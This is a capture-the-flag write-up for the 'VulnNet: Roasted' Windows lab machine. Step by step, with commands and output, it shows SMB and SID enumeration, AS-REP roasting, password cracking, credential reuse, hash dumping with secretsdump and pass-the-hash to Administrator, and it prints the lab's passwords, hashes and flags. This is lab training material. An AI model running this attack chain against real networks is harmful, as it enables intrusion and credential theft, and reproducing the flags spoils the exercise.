# VulnNet: Roasted

VulnNet Entertainment quickly deployed another management instance on their very broad network...

VulnNet Entertainment just deployed a new instance on their network with the newly-hired system administrators. Being a security-aware company, they as always hired you to perform a penetration test, and see how system administrators are performing.

* Difficulty: Easy
* Operating System: Windows

This is a much simpler machine, do not overthink. You can do it by following common methodologies.

Note: It might take up to 6 minutes for this machine to fully boot.

* Author: TheCyb3rW0lf
* Discord: TheCyb3rW0lf#8594

Icon made by DinosoftLabs from www.flaticon.com


# What is the user flag? (Desktop\user.txt)

## Services

Running a full Nmap scan will reveal several running services. Our target machine is a Windows machine, and the domain name is `vulnnet-rst.local`.

~~~
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-05-27 12:26:37Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49665/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49684/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
49708/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: WIN-2BO8M1OE1M1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-05-27T12:27:28
|_  start_date: N/A
~~~

## Samba

Starting with the Samba shares, we can use `smbclient` to list the network shares:

~~~
┌──(kali㉿kali)-[/data/VulnNet_Roasted]
└─$ smbclient -L 10.10.100.15  
Enter WORKGROUP\kali's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
	VulnNet-Business-Anonymous Disk      VulnNet Business Sharing
	VulnNet-Enterprise-Anonymous Disk      VulnNet Enterprise Sharing
SMB1 disabled -- no workgroup available
~~~

`smbmap` will also reveal the permissions:

~~~
┌──(kali㉿kali)-[/data/VulnNet_Roasted]
└─$ smbmap -u anonymous -H 10.10.117.62
[+] Guest session   	IP: 10.10.117.62:445	Name: 10.10.117.62                                      
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share 
	SYSVOL                                            	NO ACCESS	Logon server share 
	VulnNet-Business-Anonymous                        	READ ONLY	VulnNet Business Sharing
	VulnNet-Enterprise-Anonymous                      	READ ONLY	VulnNet Enterprise Sharing
~~~

Can access the anonymous shares (`VulnNet-Business-Anonymous` and `VulnNet-Enterprise-Anonymous`) but they do not host any useful files.

## Find users

As we have a read access to `IPC$` without authentication, we are able to list the domain users as anonymous:

~~~
┌──(kali㉿kali)-[/data/VulnNet_Roasted]
└─$ python3 /usr/share/doc/python3-impacket/examples/lookupsid.py anonymous@10.10.117.62 | tee users.txt
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password:
[*] Brute forcing SIDs at 10.10.117.62
[*] StringBinding ncacn_np:10.10.117.62[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-1589833671-435344116-4136949213
498: VULNNET-RST\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: VULNNET-RST\Administrator (SidTypeUser)
501: VULNNET-RST\Guest (SidTypeUser)
502: VULNNET-RST\krbtgt (SidTypeUser)
512: VULNNET-RST\Domain Admins (SidTypeGroup)
513: VULNNET-RST\Domain Users (SidTypeGroup)
514: VULNNET-RST\Domain Guests (SidTypeGroup)
515: VULNNET-RST\Domain Computers (SidTypeGroup)
516: VULNNET-RST\Domain Controllers (SidTypeGroup)
517: VULNNET-RST\Cert Publishers (SidTypeAlias)
518: VULNNET-RST\Schema Admins (SidTypeGroup)
519: VULNNET-RST\Enterprise Admins (SidTypeGroup)
520: VULNNET-RST\Group Policy Creator Owners (SidTypeGroup)
521: VULNNET-RST\Read-only Domain Controllers (SidTypeGroup)
522: VULNNET-RST\Cloneable Domain Controllers (SidTypeGroup)
525: VULNNET-RST\Protected Users (SidTypeGroup)
526: VULNNET-RST\Key Admins (SidTypeGroup)
527: VULNNET-RST\Enterprise Key Admins (SidTypeGroup)
553: VULNNET-RST\RAS and IAS Servers (SidTypeAlias)
571: VULNNET-RST\Allowed RODC Password Replication Group (SidTypeAlias)
572: VULNNET-RST\Denied RODC Password Replication Group (SidTypeAlias)
1000: VULNNET-RST\WIN-2BO8M1OE1M1$ (SidTypeUser)
1101: VULNNET-RST\DnsAdmins (SidTypeAlias)
1102: VULNNET-RST\DnsUpdateProxy (SidTypeGroup)
1104: VULNNET-RST\enterprise-core-vn (SidTypeUser)
1105: VULNNET-RST\a-whitehat (SidTypeUser)
1109: VULNNET-RST\t-skid (SidTypeUser)
1110: VULNNET-RST\j-goldenhand (SidTypeUser)
1111: VULNNET-RST\j-leet (SidTypeUser)
~~~

## Find users without Kerberos pre-authentication

Isolate users (`SidTypeUser`)

~~~
┌──(kali㉿kali)-[/data/VulnNet_Roasted]
└─$ grep SidTypeUser users.txt | awk '{print $2}' | cut -d "\\" -f2 > users.txt
                                                                                                                    
┌──(kali㉿kali)-[/data/VulnNet_Roasted]
└─$ cat users.txt 
Administrator
Guest
krbtgt
WIN-2BO8M1OE1M1$
enterprise-core-vn
a-whitehat
t-skid
j-goldenhand
j-leet
~~~

Now, let's use `GetNPUsers.py` to find users without Kerberos pre-authentication:

~~~
┌──(kali㉿kali)-[/data/VulnNet_Roasted/files]
└─$ python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py \
        -dc-ip 10.10.100.15 \ 
        -usersfile users.txt \
        -no-pass \
        vulnnet-rst.local/
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User WIN-2BO8M1OE1M1$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User enterprise-core-vn doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User a-whitehat doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:692e76f70a8772c46ed94e73130460c8$713b0693498fdaff68642d78e713ca965e5007d5d864ca727289930783fe28f00bf79fef8126c4722d09cafc72ec60e940d31297591f67ce049030cb531ddd9c83cd37796fbf414b830a7c90fe26d2c45d6f2b624cd4413c58e3dbb77519dd69906248f8db27b1974b880a826003e562e25d9de9e4cb7cfa85c1de954761053b7d51a455530001348b46909f91f4e80bae7374071339f0920bb3e2ad95169d20f05d0cd586882facb63c058072dacb7ec8ddbcd9297331e1f6fb6d844ea7967659bee38fde4431af9f9608e9adcb38cb6e20e72bcf61c524f480b5ea2530e16dbeed2272855a61a05c03e84653aa1a3bbbd5ece06633
[-] User j-goldenhand doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j-leet doesn't have UF_DONT_REQUIRE_PREAUTH set
~~~

We have found `t-skid`'s hash. Let's crack it:

~~~
┌──(kali㉿kali)-[/data/VulnNet_Roasted/files]
└─$ /data/src/john/run/john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tj072889*        ($krb5asrep$23$t-skid@VULNNET-RST.LOCAL)
1g 0:00:00:04 DONE (2021-05-27 19:51) 0.2118g/s 673410p/s 673410c/s 673410C/s tj3929..tj0216044
Use the "--show" option to display all of the cracked passwords reliably
Session completed
~~~

* User: `t-skid`
* Password: `tj072889*`

## Samba authenticated access (`t-skid`)

Using these credentials, we are now able to connect to the `NETLOGON` Samba network share:

~~~
┌──(kali㉿kali)-[/data/VulnNet_Roasted]
└─$ smbclient -U vulnnet-rst.local/t-skid //10.10.100.15/NETLOGON                                             130 ⨯
Enter VULNNET-RST.LOCAL\t-skid's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Mar 17 00:15:49 2021
  ..                                  D        0  Wed Mar 17 00:15:49 2021
  ResetPassword.vbs                   A     2821  Wed Mar 17 00:18:14 2021

		8540159 blocks of size 4096. 4318542 blocks available
smb: \> get ResetPassword.vbs -
Option Explicit

Dim objRootDSE, strDNSDomain, objTrans, strNetBIOSDomain
Dim strUserDN, objUser, strPassword, strUserNTName

' Constants for the NameTranslate object.
Const ADS_NAME_INITTYPE_GC = 3
Const ADS_NAME_TYPE_NT4 = 3
Const ADS_NAME_TYPE_1779 = 1

If (Wscript.Arguments.Count <> 0) Then
    Wscript.Echo "Syntax Error. Correct syntax is:"
    Wscript.Echo "cscript ResetPassword.vbs"
    Wscript.Quit
End If

strUserNTName = "a-whitehat" <------------------------------------------ interesting
strPassword = "bNdKVkjv3RR9ht" <---------------------------------------- interesting

' Determine DNS domain name from RootDSE object.
Set objRootDSE = GetObject("LDAP://RootDSE")
strDNSDomain = objRootDSE.Get("defaultNamingContext")

' Use the NameTranslate object to find the NetBIOS domain name from the
' DNS domain name.
Set objTrans = CreateObject("NameTranslate")
objTrans.Init ADS_NAME_INITTYPE_GC, ""
objTrans.Set ADS_NAME_TYPE_1779, strDNSDomain
strNetBIOSDomain = objTrans.Get(ADS_NAME_TYPE_NT4)
' Remove trailing backslash.
strNetBIOSDomain = Left(strNetBIOSDomain, Len(strNetBIOSDomain) - 1)

' Use the NameTranslate object to convert the NT user name to the
' Distinguished Name required for the LDAP provider.
On Error Resume Next
objTrans.Set ADS_NAME_TYPE_NT4, strNetBIOSDomain & "\" & strUserNTName
If (Err.Number <> 0) Then
    On Error GoTo 0
    Wscript.Echo "User " & strUserNTName _
        & " not found in Active Directory"
    Wscript.Echo "Program aborted"
    Wscript.Quit
End If
strUserDN = objTrans.Get(ADS_NAME_TYPE_1779)
' Escape any forward slash characters, "/", with the backslash
' escape character. All other characters that should be escaped are.
strUserDN = Replace(strUserDN, "/", "\/")

' Bind to the user object in Active Directory with the LDAP provider.
On Error Resume Next
Set objUser = GetObject("LDAP://" & strUserDN)
If (Err.Number <> 0) Then
    On Error GoTo 0
    Wscript.Echo "User " & strUserNTName _
        & " not found in Active Directory"
    Wscript.Echo "Program aborted"
    Wscript.Quit
End If
objUser.SetPassword strPassword
If (Err.Number <> 0) Then
    On Error GoTo 0
    Wscript.Echo "Password NOT reset for " &vbCrLf & strUserNTName
    Wscript.Echo "Password " & strPassword & " may not be allowed, or"
    Wscript.Echo "this client may not support a SSL connection."
    Wscript.Echo "Program aborted"
    Wscript.Quit
Else
    objUser.AccountDisabled = False
    objUser.Put "pwdLastSet", 0
    Err.Clear
    objUser.SetInfo
    If (Err.Number <> 0) Then
        On Error GoTo 0
        Wscript.Echo "Password reset for " & strUserNTName
        Wscript.Echo "But, unable to enable account or expire password"
        Wscript.Quit
    End If
End If
On Error GoTo 0

Wscript.Echo "Password reset, account enabled,"
Wscript.Echo "and password expired for user " & strUserNTNamegetting file \ResetPassword.vbs of size 2821 as - (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)
~~~

Credentials are disclosed in the VBS script:

* User: `a-whitehat`
* Password: `bNdKVkjv3RR9ht`

## User flag

Let's now use `evil-winrm` to connect using the credentials found above.

~~~
┌──(kali㉿kali)-[/data/VulnNet_Roasted]
└─$ evil-winrm -i 10.10.100.15 -u a-whitehat -p "bNdKVkjv3RR9ht"

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\a-whitehat\Documents> cd \Users
*Evil-WinRM* PS C:\Users> dir


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        5/27/2021  10:47 PM                a-whitehat
d-----        3/13/2021   3:20 PM                Administrator
d-----        3/13/2021   3:42 PM                enterprise-core-vn
d-r---        3/11/2021   7:36 AM                Public


*Evil-WinRM* PS C:\Users> cd enterprise-core-vn\Desktop
*Evil-WinRM* PS C:\Users\enterprise-core-vn\Desktop> cat user.txt
THM{726b7c0baaac1455d05c827b5561f4ed}
~~~

User flag: `THM{726b7c0baaac1455d05c827b5561f4ed}`

# What is the system flag? (Desktop\system.txt)

## Dump hashes

Let's use `secretsdump.py` to dump the hashes, using the credentials found.

~~~
┌──(kali㉿kali)-[/usr/share/doc/python3-impacket/examples]
└─$ python3 secretsdump.py vulnnet-rst.local/a-whitehat:bNdKVkjv3RR9ht@10.10.100.15                             1 ⨯
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xf10a2788aef5f622149a41b2c745f49a
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
VULNNET-RST\WIN-2BO8M1OE1M1$:aes256-cts-hmac-sha1-96:e15c59ee8e198aca3629e33c3e97f37827faaab34f475c83b76ffa53f83d58e7
VULNNET-RST\WIN-2BO8M1OE1M1$:aes128-cts-hmac-sha1-96:de131f2343b586e21ba7f0867671f397
VULNNET-RST\WIN-2BO8M1OE1M1$:des-cbc-md5:8ad94f8613101694
VULNNET-RST\WIN-2BO8M1OE1M1$:plain_password_hex:5c51fad41849d3187783c78cc334ff666a46a49248a10e81a894e0bf6e20219d775cc61d35e34d0ff6a6bb3a378026bfcdc979abc624d19b78b8f448ec263757628eb786b3d47a2e638ea70f99c9898237d12750541632540fe3b82507e7ae542e43b1f20e1ccb473af2abf1bd15b8a7990bb4c6250e1e85b12522ae9a0ba0cc04d5d8e4932eb366f6be58e84974cc817f2265e85dcfdd65a887d882cea77e22edb84e47523e11245605eb1ff867c68e966022b5918e1253e6b8908e5e25527dc8d0dfe12ffc83fe7ed3fa4216b13aff427b6e51984b6abc3960e3e353f1e0345dec4ae1b9fcceb64842dc310a20c983
VULNNET-RST\WIN-2BO8M1OE1M1$:aad3b435b51404eeaad3b435b51404ee:875ff956b083d37e2e80d256e36deece:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x20809b3917494a0d3d5de6d6680c00dd718b1419
dpapi_userkey:0xbf8cce326ad7bdbb9bbd717c970b7400696d3855
[*] NL$KM 
 0000   F3 F6 6B 8D 1E 2A F4 8E  85 F6 7A 46 D1 25 A0 D3   ..k..*....zF.%..
 0010   EA F4 90 7D 2D CB A5 8C  88 C5 68 4C 1E D3 67 3B   ...}-.....hL..g;
 0020   DB 31 D9 91 C9 BB 6A 57  EA 18 2C 90 D3 06 F8 31   .1....jW..,....1
 0030   7C 8C 31 96 5E 53 5B 85  60 B4 D5 6B 47 61 85 4A   |.1.^S[.`..kGa.J
NL$KM:f3f66b8d1e2af48e85f67a46d125a0d3eaf4907d2dcba58c88c5684c1ed3673bdb31d991c9bb6a57ea182c90d306f8317c8c31965e535b8560b4d56b4761854a

[REDACTED]
~~~

## System flag

Now that we have the administrator's hash, we can use it to connect and get the sytem flag:

~~~
┌──(kali㉿kali)-[/usr/share/doc/python3-impacket/examples]
└─$ evil-winrm -i 10.10.100.15 -u administrator -H "c2597747aa5e43022a3a3049a3c3b09d"                           1 ⨯

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        3/13/2021   3:34 PM             39 system.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat system.txt
THM{16f45e3934293a57645f8d7bf71d8d4c}
~~~

System flag: `THM{16f45e3934293a57645f8d7bf71d8d4c}`
